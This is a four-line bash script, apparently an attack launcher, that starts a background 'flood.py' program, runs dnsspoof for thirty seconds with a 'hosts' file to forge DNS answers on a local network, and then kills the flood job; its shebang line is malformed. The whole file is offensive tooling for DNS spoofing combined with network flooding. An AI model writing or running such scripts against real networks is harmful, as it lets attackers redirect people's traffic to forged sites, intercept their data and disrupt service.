#!usr/bin/bash
python flood.py& 
timeout 30 dnsspoof -f hosts
kill %%

